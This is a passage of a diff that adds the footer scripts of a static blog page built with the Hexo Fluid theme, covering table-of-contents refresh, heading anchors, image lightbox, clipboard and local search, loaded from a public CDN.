+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
